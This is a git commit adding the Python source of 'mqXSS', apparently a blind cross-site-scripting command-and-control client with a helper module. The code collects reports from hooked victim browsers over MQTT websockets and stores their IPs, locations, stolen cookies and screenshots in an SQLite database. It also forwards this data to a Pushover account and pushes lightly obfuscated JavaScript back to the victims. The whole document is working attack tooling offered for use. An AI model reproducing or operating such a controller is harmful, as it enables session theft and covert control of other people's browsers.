8e58ce6ccbd7e63e0e6f8669106633885e6abb18
grampae <36344197+grampae@users.noreply.github.com>
2023-07-03 01:25:00 -0400

    Add files via upload

---
+++ mqxss.py
@@ -0,0 +1,193 @@
+#!/usr/bin/python3
+#mqxss client, send javascript commands to hooked browsers over mqtt wss connections
+import paho.mqtt.client as mqtt
+import sessions
+import sys
+import os
+import sqlite3
+import pandas as pd 
+import threading
+import requests
+import base64
+import argparse
+import signal
+import string
+import random
+from rich import print
+from rich.prompt import Prompt
+from rich.markup import escape
+from os import getcwd
+from pathlib import Path
+
+# Cli arguments
+parser = argparse.ArgumentParser(description="mqXSS: blind XSS client using websockets over mqtt", formatter_class=argparse.RawDescriptionHelpFormatter)
+parser.add_argument("-b", dest="broker", required=True, help="Broker domain name")
+parser.add_argument("-p", dest="bport", required=True, help="Broker port")
+parser.add_argument("-t", dest="btopic", required=True, help="Base topic")
+parser.add_argument("-po", dest="push", required=False, help="Send hooked browser responses to pushover", action="store_true")
+parser.add_argument("-js", dest="js", required=False, help="Send javascript to hooked browsers")
+
+args = parser.parse_args()
+if len(sys.argv)==1:
+	parser.print_help(sys.stderr)
+	sys.exit(1)
+
+mbroker = args.broker
+mport = args.bport
+mtopic = args.btopic
+ppush = args.push
+jsarg = args.js
+# banner
+mqxss = '''
+                   ___ ___   _______  _______ 
+.--------..-----. (   Y   ) |   _   ||   _   |
+|        ||  _  |  \  1  /  |   1___||   1___|
+|__|__|__||__   |  /  _  \  |____   ||____   |
+             |__| /:  |   \ |:  1   ||:  1   |
+                 (::. |:.  )|::.. . ||::.. . |
+                  `--- ---' `-------'`-------'
+                                      v0_1    
+    
+Commands:   'hooked' view hooked browsers.
+	    'unhooked' view unhooked browsers.
+	    'cookies' view captured cookies.
+	    'js' send javascript to hooked browser.
+	    'help' this screen.
+	    'exit' to leave.
+'''
+print(mqxss)
+# Define subscriptions folders and var
+
+cwd = getcwd()
+topic_out = mtopic+"/out/#"
+topic_cmd = mtopic+"/cmd/"
+topic_ss = mtopic+"/ss/#"
+topic_rdy = mtopic+"/rdy/#"
+topic_js = mtopic+"/jsout/#"
+scdir = cwd+"/screenshots/"
+Path(scdir).mkdir(parents=True, exist_ok=True)
+mport2 = int(mport)
+
+# handle sig
+def handler(signum, frame):
+	res = input(" Ctrl-c was pressed. Do you really want to exit? y/n ")
+	if res == 'y':
+		exit(1)
+signal.signal(signal.SIGINT, handler)
+# pushover variables
+ptoken = "set pushover token here"
+userkey = "set user key here"
+pdevice = ""
+if ppush:
+	print("[[grey82]mqXSS[/grey82]] Sending hooked browser responses to pushover device")
+
+# mqtt handlers
+def on_connect(client, userdata, flags, rc):
+	client.subscribe([(topic_out,1),(topic_ss,1),(topic_rdy,1)])
+	print("[[grey82]mqXSS[/grey82]] Subscribed to [grey78]"+mtopic+"[/grey78] topic, at broker [grey78]"+mbroker+"[/grey78] on port [grey78]"+escape(mport)+"[/grey78]")
+def on_message(client, userdata, msg):
+	vicid = msg.topic.split("/")[2]
+	output = str(msg.payload.decode('UTF-8'))
+	str1 = ''.join([chr(int(output[i:i+2], 16)-1) for i in range(0, len(output), 2)])
+	str2 = escape(str1)
+	print("[[grey82]mqXSS[/grey82]] [grey89]"+str2+"[/grey89] ", end="\n")
+	if "XSS fired" in str2:
+		sessions.addhook(str2, mbroker, mport, mtopic)
+	if "Cookies" in str2:
+		sessions.addhook2(str2)
+	if "Disconnected" in str2:
+		sessions.remhook(str2)
+	if "Reconnected" in str2:
+		sessions.rechook(str2)
+	if ppush:
+		#send messages to pushover
+		data = { "token": ptoken, "user": userkey, "title": "Message received from "+vicid , "message": str1, "device": pdevice}
+		try:
+			r = requests.post("https://api.pushover.net/1/messages.json", data = data)
+		except Exception as e:
+			print(e)
+
+# get download
+def on_download(client, userdata, msg):
+	on_download.vicid = msg.topic.split("/")[2]
+	ran = ''.join(random.choices(string.ascii_lowercase, k=5))
+	file1 = on_download.vicid+"-"+ran+".png"
+	filename = scdir+file1
+	save_download(msg.payload, filename, file1)
+	
+#download the screenshot
+def save_download(payload, filename, file1):
+	with open(filename, "wb") as fh:
+		decodedimg = base64.b64decode(payload)
+		fh.write(decodedimg)
+		sessions.addhook3(on_download.vicid, file1)
+	print("[[grey82]mqXSS[/grey82]] [grey89]"+on_download.vicid+": Screenshot saved as "+escape(filename)+"[/grey89]")
+	if ppush:
+		#send image to pushover
+		files = { "attachment": (filename, open(filename, "rb"), "image/png") }
+		data = { "token": ptoken, "user": userkey, "message": "Screenshot received from "+on_download.vicid , "device": pdevice}
+		try:
+			r = requests.post("https://api.pushover.net/1/messages.json", data = data, files = files)
+		except Exception as e:
+			print(e)
+
+# browser is ready
+def on_rdy(client, userdata, msg):
+	if jsarg:
+		vicid = msg.topic.split("/")[2]
+		tcmd = topic_cmd+vicid;
+		print("[[grey82]mqXSS[/grey82]][grey89]"+escape(vicid)+": Sending JS[/grey89] ")
+		sjg = ''.join(hex(ord(e)+1)[2:] for e in jsarg)
+		client.publish(tcmd, sjg)
+		
+#handle user prompt and sending of js
+def sendjs():
+	while True:
+		burg = input()
+		try:
+			if burg == "js":
+				vicid2 = Prompt.ask("[[grey82]mqXSS[/grey82]][grey89] Enter client ID to send JS[/grey89]")
+				vicid3 = sessions.getagent(vicid2)
+				if vicid3 is None:
+					continue
+				tcmd = topic_cmd+vicid3;
+				jsarg2 = Prompt.ask("[[grey82]mqXSS[/grey82]][grey89] Enter JS to send")
+				print("[[grey82]mqXSS[/grey82]] [grey89]"+vicid3+": Sending JS[/grey89] ")
+				sjg = ''.join(hex(ord(e)+1)[2:] for e in jsarg2)
+				client.publish(tcmd, sjg)
+			elif burg == "hooked":
+				sessions.gethooked()
+			elif burg == "unhooked":
+				sessions.getunhooked()
+			elif burg == "cookies":
+				sessions.monster()
+			elif burg == "help":
+				print(mqxss)
+			elif burg == "exit":
+				os._exit(1)
+		except Exception as e:
+			print(e)
+#main mqtt handlers
+def mqttproc():
+	try:
+		client.connect(mbroker, mport2, keepalive=20)
+	except Exception as e:
+		print("[[grey66]mqXSS[/grey66]] "+str(e))
+		exit(1)
+	client.loop_forever()
+
+tmqtt=threading.Thread(target=mqttproc)
+sjs=threading.Thread(target=sendjs)
+
+if __name__ == "__main__":
+	sessions.chooked()
+	sessions.cunhooked()
+	client = mqtt.Client(transport='websockets',client_id="archibald-spelunking",clean_session=False)
+	client.tls_set()
+	client.message_callback_add(topic_ss,on_download)
+	client.message_callback_add(topic_out,on_message)
+	client.message_callback_add(topic_rdy,on_rdy)
+	client.on_connect = on_connect
+	#client.username_pw_set(username="flagrantmarshmallow",password="rickjame$bitchezzz")
+	tmqtt.start()
+	sjs.start()
---
+++ sessions.py
@@ -0,0 +1,155 @@
+import sqlite3
+import pandas as pd
+from datetime import datetime
+from rich import print
+import re
+import os
+
+dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqxss.db")
+conn = sqlite3.connect(dbfile)
+cursor = conn.cursor()
+pd.set_option('display.max_rows', None)
+pd.set_option('display.max_columns', None)
+pd.set_option('display.width', 1000)
+pd.set_option('display.colheader_justify', 'center')
+pd.set_option('display.precision', 2)
+pd.set_option('display.max_colwidth', 35)
+pd.set_option('display.expand_frame_repr', True)
+
+#create tables if not exist
+def chooked():
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	cursor.execute("CREATE TABLE IF NOT EXISTS hooked (ID INTEGER PRIMARY KEY AUTOINCREMENT, Agent TEXT, IP TEXT, Location TEXT, Cookies TEXT, UA TEXT, OS TEXT, Screenshot TEXT, Broker TEXT, LastSeen TEXT)")
+	conn.commit()
+	conn.close()
+def cunhooked():
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	cursor.execute("CREATE TABLE IF NOT EXISTS unhooked (ID INTEGER PRIMARY KEY AUTOINCREMENT, Agent TEXT, IP TEXT, Location TEXT, Cookies TEXT, UA TEXT, OS TEXT, Screenshot TEXT, Broker TEXT, LastSeen TEXT)")
+	conn.commit()
+	conn.close()
+	
+#add initial hooked info
+def addhook(infos, mbroker, mport, mtopic):
+	Agent = re.search(r'(.*?)\: XSS', infos).group(1)
+	Location = re.search(r'Location\:(.*?)IP\:', infos).group(1)
+	IP = re.search(r'IP\:(.*?)OS\:', infos).group(1)
+	OS = re.search(r'OS\:(.*?)UA\:', infos).group(1)
+	UA = infos.split("UA:",1)[1]
+	broker = mbroker+":"+mport+"/"+mtopic
+	dt1 = datetime.now()
+	dt2 = dt1.strftime("%m/%d/%Y, %H:%M:%S")
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	cursor.execute("""
+	INSERT INTO hooked(Agent, IP, Location, UA, OS, Broker, LastSeen)
+	VALUES (?,?,?,?,?,?,?)
+	""", (Agent, IP, Location, UA, OS, broker, dt2))
+	conn.commit()
+	conn.close()
+	
+#add cookies
+def addhook2(infos):
+	Agent = re.search(r'(.*?)\: Cookies', infos).group(1)
+	Cookies = infos.split("Cookies:",1)[1]
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	conn.execute("UPDATE hooked set Cookies = ? where Agent = ?",(Cookies, Agent))
+	conn.commit()
+	conn.close()
+	
+#add screenshot
+def addhook3(Agent, filename):
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	conn.execute("UPDATE hooked set Screenshot = ? where Agent = ?", (filename, Agent))
+	conn.commit()
+	conn.close()
+
+# get agent
+def getagent(ID):
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	agentret = pd.read_sql('SELECT Agent FROM hooked where ID = ?', conn, params=(ID,))
+	df_empty = pd.DataFrame(agentret)
+	if df_empty.empty:
+		print("[[grey82]mqXSS[/grey82]] [grey89]No hooked browser with ID of "+ID+".[/grey89]")
+		conn.close()
+		return
+	else:
+		agentz = df_empty.to_string(header=False, index=False)
+		return agentz
+		conn.close()
+
+#display hooked
+def gethooked():
+	pd.set_option('display.max_colwidth', 35)
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	hooked = pd.read_sql('SELECT ID, IP, Location, Cookies, UA, OS, Screenshot, Broker, LastSeen FROM hooked', conn, index_col=['ID'])
+	df_empty = pd.DataFrame(hooked)
+	if df_empty.empty:
+		print("[[grey82]mqXSS[/grey82]] [grey89]No hooked browsers yet.[/grey89]")
+		conn.close()
+		return
+	else:
+		print("\n")
+		print(hooked.head())
+		print("\n")
+		conn.close()
+		
+#move hooked to unooked
+def remhook(infos):
+	Agent = re.search(r'(.*?)\: Disconnected', infos).group(1)
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	conn.execute("INSERT or IGNORE INTO unhooked SELECT * FROM hooked WHERE Agent = ?", [Agent])
+	conn.execute("DELETE FROM hooked WHERE Agent = ?",[Agent])
+	conn.commit()
+	conn.close()
+
+#move reconnected browser to hooked
+def rechook(infos):
+	Agent = re.search(r'(.*?)\: Reconnected', infos).group(1)
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	conn.execute("INSERT or IGNORE INTO hooked SELECT * FROM unhooked WHERE Agent = ?", [Agent])
+	conn.execute("DELETE FROM unhooked WHERE Agent = ?",[Agent])
+	conn.commit()
+	conn.close()
+
+#get cookies
+def monster():
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	hooked = pd.read_sql('SELECT ID, Location, Cookies FROM hooked UNION SELECT ID, Location, Cookies FROM unhooked', conn, index_col=['ID'])
+	conn.close()
+	df_empty = pd.DataFrame(hooked)
+	if df_empty.empty:
+		print("[[grey82]mqXSS[/grey82]] [grey89]No cookies yet.[/grey89]")
+		conn.close()
+		return
+	else:
+		pd.set_option('display.colheader_justify', 'left')
+		pd.set_option('display.max_colwidth', None)
+		print("\n")
+		print(hooked.head())
+		print("\n")
+		conn.close()
+
+#display unhooked
+def getunhooked():
+	conn = sqlite3.connect(dbfile)
+	cursor = conn.cursor()
+	unhooked = pd.read_sql('SELECT ID, IP, Location, Cookies, UA, OS, Screenshot, Broker, LastSeen FROM unhooked', conn, index_col=['ID'])
+	df_empty = pd.DataFrame(unhooked)
+	if df_empty.empty:
+		print("[[grey82]mqXSS[/grey82]] [grey89]No unhooked browsers yet.[/grey89]")
+		conn.close()
+		return
+	else:
+		print("\n")
+		print(unhooked.head())
+		print("\n")
+		conn.close()
